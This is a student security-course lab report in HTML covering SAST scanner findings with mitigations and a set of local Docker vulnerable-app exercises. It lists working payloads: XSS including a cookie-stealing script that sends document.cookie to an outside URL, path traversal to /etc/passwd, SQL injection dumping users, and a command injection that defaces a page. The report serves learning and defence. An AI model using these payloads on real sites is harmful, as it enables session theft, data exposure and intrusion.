@@ -1,0 +1,495 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome file</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="vulnerability-scanning-report">Vulnerability Scanning Report</h1>
+<h2 id="author-muhibullo-khujabekov-cs-02">Author: Muhibullo Khujabekov (CS-02)</h2>
+<hr>
+<h2 id="task-1---sast-tools">Task 1 - SAST Tools</h2>
+<h3 id="bandit-python">1. Bandit (Python)</h3>
+<h4 id="findings">Findings:</h4>
+<ul>
+<li><strong>High Severity:</strong></li>
+</ul>
+<pre class=" language-bash"><code class="prism  language-bash">
+<span class="token operator">&gt;&gt;</span> Issue: <span class="token punctuation">[</span>B201:flask_debug_true<span class="token punctuation">]</span> A Flask app appears to be run with debug<span class="token operator">=</span>True,  <span class="token function">which</span>  exposes  the  Werkzeug  debugger  and  allows  the  execution  of  arbitrary  code.
+
+Severity: High Confidence: Medium
+
+CWE: CWE-94 <span class="token punctuation">(</span>https://cwe.mitre.org/data/definitions/94.html<span class="token punctuation">)</span>
+
+More Info: https://bandit.readthedocs.io/en/1.8.3/plugins/b201_flask_debug_true.html
+
+Location: ./bad/vulpy-ssl.py:29:0
+
+28
+
+29 app.run<span class="token punctuation">(</span>debug<span class="token operator">=</span>True,  host<span class="token operator">=</span><span class="token string">'127.0.1.1'</span>,  ssl_context<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'/tmp/acme.cert'</span>,  <span class="token string">'/tmp/acme.key'</span><span class="token punctuation">))</span>
+
+</code></pre>
+<ul>
+<li><strong>Medium Severity:</strong></li>
+</ul>
+<pre class=" language-bash"><code class="prism  language-bash">
+<span class="token operator">&gt;&gt;</span> Issue: <span class="token punctuation">[</span>B108:hardcoded_tmp_directory<span class="token punctuation">]</span> Probable insecure usage of temp file/directory.
+
+Severity: Medium Confidence: Medium
+
+CWE: CWE-377 <span class="token punctuation">(</span>https://cwe.mitre.org/data/definitions/377.html<span class="token punctuation">)</span>
+
+More Info: https://bandit.readthedocs.io/en/1.8.3/plugins/b108_hardcoded_tmp_directory.html
+
+Location: ./bad/vulpy-ssl.py:29:51
+
+28
+
+29 app.run<span class="token punctuation">(</span>debug<span class="token operator">=</span>True,  host<span class="token operator">=</span><span class="token string">'127.0.1.1'</span>,  ssl_context<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'/tmp/acme.cert'</span>,  <span class="token string">'/tmp/acme.key'</span><span class="token punctuation">))</span>
+
+</code></pre>
+<ul>
+<li><strong>Low Severity:</strong></li>
+</ul>
+<pre class=" language-bash"><code class="prism  language-bash">
+<span class="token operator">&gt;&gt;</span> Issue: <span class="token punctuation">[</span>B105:hardcoded_password_string<span class="token punctuation">]</span> Possible hardcoded password: <span class="token string">'aaaaaaa'</span>
+
+Severity: Low Confidence: Medium
+
+CWE: CWE-259 <span class="token punctuation">(</span>https://cwe.mitre.org/data/definitions/259.html<span class="token punctuation">)</span>
+
+More Info: https://bandit.readthedocs.io/en/1.8.3/plugins/b105_hardcoded_password_string.html
+
+Location: ./bad/vulpy.py:16:11
+
+15 app <span class="token operator">=</span> Flask<span class="token punctuation">(</span><span class="token string">'vulpy'</span><span class="token punctuation">)</span>
+
+16 app.config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'aaaaaaa'</span>
+
+</code></pre>
+<h4 id="mitigations">Mitigations:</h4>
+<ol>
+<li><strong>High Severity (B201:flask_debug_true)</strong></li>
+</ol>
+<ul>
+<li>
+<p><strong>Issue:</strong> Running Flask with <code>debug=True</code>.</p>
+</li>
+<li>
+<p><strong>CWE:</strong> CWE-94</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Disable debug mode in production. Use environment variables to control it.</p>
+</li>
+</ul>
+<ol start="2">
+<li><strong>Medium Severity (B108:hardcoded_tmp_directory)</strong></li>
+</ol>
+<ul>
+<li>
+<p><strong>Issue:</strong> Insecure usage of temp directory.</p>
+</li>
+<li>
+<p><strong>CWE:</strong> CWE-377</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Use secure temporary file handling (e.g., Python’s <code>tempfile</code> module).</p>
+</li>
+</ul>
+<ol start="3">
+<li><strong>Low Severity (B105:hardcoded_password_string)</strong></li>
+</ol>
+<ul>
+<li>
+<p><strong>Issue:</strong> Hardcoded password.</p>
+</li>
+<li>
+<p><strong>CWE:</strong> CWE-259</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Store passwords in environment variables or secure configuration files.</p>
+</li>
+</ul>
+<hr>
+<h3 id="flawfinder-c">2. Flawfinder ©</h3>
+<h4 id="findings-1">Findings:</h4>
+<ul>
+<li><strong>Level 1 Vulnerability:</strong></li>
+</ul>
+<pre class=" language-bash"><code class="prism  language-bash">
+./linux/imgRead_socket.c:74: <span class="token punctuation">[</span>1<span class="token punctuation">]</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> read:
+
+Check buffer boundaries <span class="token keyword">if</span>  used  <span class="token keyword">in</span>  a  loop  including  recursive  loops
+
+<span class="token punctuation">(</span>CWE-120,  CWE-20<span class="token punctuation">)</span>.
+
+</code></pre>
+<ul>
+<li><strong>Level 2 Vulnerability:</strong></li>
+</ul>
+<pre class=" language-bash"><code class="prism  language-bash">
+./linux/imgRead_socket.c:131: <span class="token punctuation">[</span>2<span class="token punctuation">]</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> memcpy:
+
+Does not check <span class="token keyword">for</span> buffer overflows when copying to destination <span class="token punctuation">(</span>CWE-120<span class="token punctuation">)</span>.
+
+Make sure destination can always hold the <span class="token function">source</span> data.
+
+</code></pre>
+<h4 id="mitigations-1">Mitigations:</h4>
+<ol>
+<li><strong>Level 1 Vulnerability</strong></li>
+</ol>
+<ul>
+<li>
+<p><strong>Issue:</strong> Use of <code>read()</code> without checking buffer boundaries.</p>
+</li>
+<li>
+<p><strong>CWE:</strong> CWE-120 (Buffer Copy without Checking Size of Input)</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Ensure that the buffer size is checked before reading data into it. Limit the amount of data read to the size of the buffer to prevent overflows.</p>
+</li>
+</ul>
+<ol start="2">
+<li><strong>Level 2 Vulnerability</strong></li>
+</ol>
+<ul>
+<li>
+<p><strong>Issue:</strong> Use of <code>memcpy()</code> without checking for buffer overflows.</p>
+</li>
+<li>
+<p><strong>CWE:</strong> CWE-120 (Buffer Copy without Checking Size of Input)</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Verify that the destination buffer is large enough to hold the source data before performing the copy. Use functions like <code>memcpy_s()</code> if available, which include bounds checking.</p>
+</li>
+</ul>
+<ol start="3">
+<li><strong>Level 3 Vulnerability</strong></li>
+</ol>
+<ul>
+<li><strong>Issue:</strong> Not found.</li>
+</ul>
+<ol start="4">
+<li><strong>False-positive finding</strong></li>
+</ol>
+<pre class=" language-bash"><code class="prism  language-bash">
+struct Image
+
+<span class="token punctuation">{</span>
+
+char  header<span class="token punctuation">[</span>4<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+int  width<span class="token punctuation">;</span>
+
+int  height<span class="token punctuation">;</span>
+
+char  data<span class="token punctuation">[</span>10<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+</code></pre>
+<p>This code snippet from <code>dvcp.c</code> can be false-positive if the <code>data</code> field in the <code>Image</code> structure is guaranteed to never exceed 10 characters in the actual use case, the buffer overflow concern might be a false positive</p>
+<hr>
+<h3 id="njsscan-nodejs">3. njsscan (NodeJS)</h3>
+<h4 id="findings-2">Findings:</h4>
+<ul>
+<li><strong>ERROR Severity:</strong></li>
+</ul>
+<pre class=" language-html"><code class="prism  language-html">
+RULE ID node_deserialize
+
+CWE CWE-502: Deserialization of Untrusted Data
+
+OWASP-WEB A8: Insecure Deserialization
+
+DESCRIPTION User controlled data in 'unserialize()' or 'deserialize()' function can result in Object Injection or Remote Code Injection.
+
+SEVERITY ERROR
+
+FILES
+
+File core/appHandler.js
+
+Match Position 18 - 81
+
+Line Number(s) 218
+
+Match String
+
+var products = serialize.unserialize(req.files.products.data.toString('utf8'))
+
+</code></pre>
+<ul>
+<li><strong>WARNING Severity:</strong></li>
+</ul>
+<pre class=" language-html"><code class="prism  language-html">
+RULE ID sequelize_tls
+
+CWE CWE-319: Cleartext Transmission of Sensitive Information
+
+OWASP-WEB A6: Security Misconfiguration
+
+DESCRIPTION The Sequelize connection string indicates that database server does not use TLS. Non TLS connections are susceptible to man in the middle (MITM) attacks.
+
+SEVERITY WARNING
+
+FILES
+
+File config/db.js
+
+Match Position 18 - 2
+
+Line Number(s) 1: 8
+
+Match String
+
+module.exports = {
+
+username: process.env.MYSQL_USER,
+
+password: process.env.MYSQL_PASSWORD,
+
+database: process.env.MYSQL_DATABASE,
+
+host: process.env.MYSQL_HOST || 'mysql-db',
+
+port: process.env.MYSQL_PORT || 3306,
+
+dialect: 'mysql'
+
+}
+
+</code></pre>
+<ul>
+<li><strong>INFO Severity:</strong></li>
+</ul>
+<pre class=" language-html"><code class="prism  language-html">
+RULE ID cookie_session_default
+
+CWE CWE-522: Insufficiently Protected Credentials
+
+OWASP-WEB A2: Broken Authentication
+
+DESCRIPTION Consider changing the default session cookie name. An attacker can use it to fingerprint the server and target attacks accordingly.
+
+SEVERITY INFO
+
+FILES
+
+File server.js
+
+Match Position 9 - 3
+
+Line Number(s) 23: 28
+
+Match String
+
+app.use(session({
+
+secret: 'keyboard cat',
+
+resave: true,
+
+saveUninitialized: true,
+
+cookie: { secure: false }
+
+}))
+
+</code></pre>
+<h4 id="mitigations-2">Mitigations:</h4>
+<ol>
+<li><strong>ERROR Severity Finding</strong></li>
+</ol>
+<ul>
+<li>
+<p><strong>Issue:</strong> Deserialization of Untrusted Data</p>
+</li>
+<li>
+<p><strong>CWE:</strong> CWE-502</p>
+</li>
+<li>
+<p><strong>OWASP:</strong> A8: Insecure Deserialization</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Avoid deserializing untrusted data. If deserialization is necessary, implement strict validation and sanitization of the input data.</p>
+</li>
+</ul>
+<ol start="2">
+<li><strong>WARNING Severity Finding</strong></li>
+</ol>
+<ul>
+<li>
+<p><strong>Issue:</strong> Cleartext Transmission of Sensitive Information</p>
+</li>
+<li>
+<p><strong>CWE:</strong> CWE-319</p>
+</li>
+<li>
+<p><strong>OWASP:</strong> A6: Security Misconfiguration</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Ensure that the database connection uses TLS to encrypt data in transit.</p>
+</li>
+</ul>
+<ol start="3">
+<li><strong>INFO Severity Finding</strong></li>
+</ol>
+<ul>
+<li>
+<p><strong>Issue:</strong> Insufficiently Protected Credentials</p>
+</li>
+<li>
+<p><strong>CWE:</strong> CWE-522</p>
+</li>
+<li>
+<p><strong>OWASP:</strong> A2: Broken Authentication</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Change the default session cookie name to a unique, non-default value.</p>
+</li>
+</ul>
+<hr>
+<h2 id="task-2---web-security-mini-labs">Task 2 - Web Security Mini Labs</h2>
+<h3 id="cross-site-scripting-xss">2.1 Cross Site Scripting (XSS)</h3>
+<pre class=" language-bash"><code class="prism  language-bash">
+docker  run  -p  127.0.0.1:5000:5000  sh3b0/vuln:xss
+
+</code></pre>
+<ul>
+<li><strong>Simple Alert:</strong></li>
+</ul>
+<pre class=" language-xss"><code class="prism  language-xss">
+&lt;script&gt;alert('&lt;Muhibullo&gt; XSS');&lt;/script&gt;
+
+</code></pre>
+<p><img src="https://i.ibb.co/v40Mgyzm/Screenshot-2025-03-04-184414.png" alt="Simple Alert"></p>
+<ul>
+<li><strong>Redirect User:</strong></li>
+</ul>
+<pre class=" language-xss"><code class="prism  language-xss">
+&lt;script&gt;window.location='https://t.me/QWERTY_5999';&lt;/script&gt;
+
+</code></pre>
+<p><img src="https://i.ibb.co/Mkp61WY8/Screenshot-2025-03-04-185027.png" alt="Redirect User"></p>
+<ul>
+<li><strong>Steal Cookies:</strong></li>
+</ul>
+<pre class=" language-xss"><code class="prism  language-xss">
+&lt;script&gt;document.location='https://t.me/QWERTY_5999?cookie='+document.cookie;&lt;/script&gt;
+
+</code></pre>
+<p><img src="https://i.ibb.co/0SpXpFK/Screenshot-2025-03-04-185727.png" alt="Steal Cookies"></p>
+<ul>
+<li><strong>DOM-Based XSS:</strong></li>
+</ul>
+<pre class=" language-xss"><code class="prism  language-xss">
+&lt;img src="x" onerror="alert('XSS')"&gt;
+
+</code></pre>
+<p><img src="https://i.ibb.co/yBPt6XSP/Screenshot-2025-03-04-190001.png" alt="DOM-Based XSS"></p>
+<ul>
+<li><strong>Exploit URL Parameters:</strong></li>
+</ul>
+<pre class=" language-xss"><code class="prism  language-xss">
+http://google.com/search?q=&lt;script&gt;alert('XSS');&lt;/script&gt;
+
+</code></pre>
+<p><img src="https://i.ibb.co/v6mvF2j3/Screenshot-2025-03-04-190605.png" alt="Exploit URL Parameters"></p>
+<h3 id="why-xss-is-dangerous"><strong>Why XSS is Dangerous</strong></h3>
+<p>Imagine you’re browsing a website, and suddenly it starts acting weird—maybe it steals your login session or redirects you to a shady page. That’s what XSS (Cross-Site Scripting) does. Attackers sneak malicious scripts into websites, and when you visit, those scripts run in your browser. This can lead to stolen cookies, hijacked accounts, or even malware being downloaded to your device. To stop this, websites need to clean up user inputs, use security policies like CSP, and rely on frameworks that block these sneaky scripts.</p>
+<hr>
+<h3 id="path-traversal">2.2 Path Traversal</h3>
+<pre class=" language-bash"><code class="prism  language-bash">
+docker  run  -p  127.0.0.1:5000:5000  sh3b0/vuln:path-traversal
+
+</code></pre>
+<ul>
+<li><strong>Payload:</strong>  <code>../../../etc/passwd</code></li>
+</ul>
+<p><img src="https://i.ibb.co/twtkT72J/2025-03-04-233242.png" alt="Path Traversal"></p>
+<ul>
+<li><strong>Result:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/6c1N3nmS/2025-03-04-232918.png" alt="Result"></p>
+<ul>
+<li><strong>Server Output:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/BV95VDj3/2025-03-04-233400.png" alt="Server Output"></p>
+<h3 id="why-path-traversal-is-dangerous"><strong>Why Path Traversal is Dangerous</strong></h3>
+<p>Think of a website’s file system like a locked filing cabinet. Path traversal is when an attacker finds a way to pick the lock and access files they shouldn’t—like sensitive configuration files or passwords. It’s like someone rummaging through your private documents. To prevent this, developers need to carefully control how file paths are handled, use allowlists to restrict access, and make sure user input can’t be used to navigate the file system.</p>
+<hr>
+<h3 id="sql-injection">2.3 SQL Injection</h3>
+<pre class=" language-bash"><code class="prism  language-bash">
+docker  run  -p  127.0.0.1:5000:5000  sh3b0/vuln:sql-injection
+
+</code></pre>
+<ul>
+<li><strong>Basic Payload:</strong>  <code>' OR '1'='1</code></li>
+</ul>
+<p><img src="https://i.ibb.co/2GfjBmV/2025-03-04-234314.png" alt="Basic Payload"></p>
+<ul>
+<li><strong>Retrieve Admin Credentials:</strong>  <code>1 UNION SELECT * FROM users</code></li>
+</ul>
+<p><img src="https://i.ibb.co/60hNhTRz/2025-03-04-234949.png" alt="Retrieve Admin Credentials"></p>
+<ul>
+<li><strong>Repeater Check:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/bgBMzkTZ/2025-03-04-235051.png" alt="Repeater Check"></p>
+<ul>
+<li><strong>Result:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/NdqQ0zjF/2025-03-04-233956.png" alt="Result"></p>
+<ul>
+<li><strong>Server Output:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/5gZqvYtV/2025-03-04-235414.png" alt="Server Output"></p>
+<h3 id="why-sql-injection-is-dangerous"><strong>Why SQL Injection is Dangerous</strong></h3>
+<p>Databases are the backbone of most websites, storing everything from user info to payment details. SQL Injection is like tricking the database into giving up its secrets or even letting attackers mess with the data. Imagine someone logging into your account without a password or deleting entire tables of data. To avoid this, developers should use secure coding practices like prepared statements, ORM frameworks, and strict input validation to keep attackers out.</p>
+<hr>
+<h3 id="file-upload">2.4 File Upload</h3>
+<pre class=" language-bash"><code class="prism  language-bash">
+docker  run  -p  127.0.0.1:5000:5000  sh3b0/vuln:file-upload
+
+</code></pre>
+<ul>
+<li><strong>Intercept File Upload:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/39FvFVwW/2025-03-05-011016.png" alt="Intercept File Upload"></p>
+<ul>
+<li><strong>Result:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/d4T6NjfY/2025-03-05-010936.png" alt="Result"></p>
+<ul>
+<li><strong>Server Output:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/gZ2s5zM4/2025-03-05-011119.png" alt="Server Output"></p>
+<h3 id="why-unrestricted-file-upload-is-dangerous"><strong>Why Unrestricted File Upload is Dangerous</strong></h3>
+<p>Let’s say a website lets users upload files without proper checks. An attacker could upload a malicious file disguised as an image or document. Once uploaded, this file could deface the website, spread malware, or even give the attacker control over the server. It’s like letting a stranger drop a bomb in your house. To prevent this, websites should verify file types, enforce server-side checks, limit upload permissions, and store files securely outside the web root.</p>
+<hr>
+<h3 id="command-injection">2.5 Command Injection</h3>
+<pre class=" language-bash"><code class="prism  language-bash">
+docker  run  -p  127.0.0.1:5000:5000  sh3b0/vuln:command-injection
+
+</code></pre>
+<ul>
+<li><strong>Payload:</strong>  <code>; sed -i 's/CMD Image resize/You have been hacked/g' templates/index.html;</code></li>
+</ul>
+<p><img src="https://i.ibb.co/zWW4MPCx/2025-03-05-022512.png" alt="Payload"></p>
+<ul>
+<li><strong>Result:</strong></li>
+</ul>
+<p><img src="https://i.ibb.co/rG9STvfb/2025-03-05-022609.png" alt="Result"></p>
+<h3 id="why-command-injection-is-dangerous"><strong>Why Command Injection is Dangerous</strong></h3>
+<p>Command injection is like giving an attacker a remote control to your server. They can run any command they want—delete files, steal data, or even take over the entire system. It’s one of the scariest vulnerabilities because it can lead to complete system compromise. To avoid this, developers should never execute system commands using user input, use safer APIs, and rigorously validate all inputs.</p>
+<hr>
+</div>
+</body>
+
+</html>
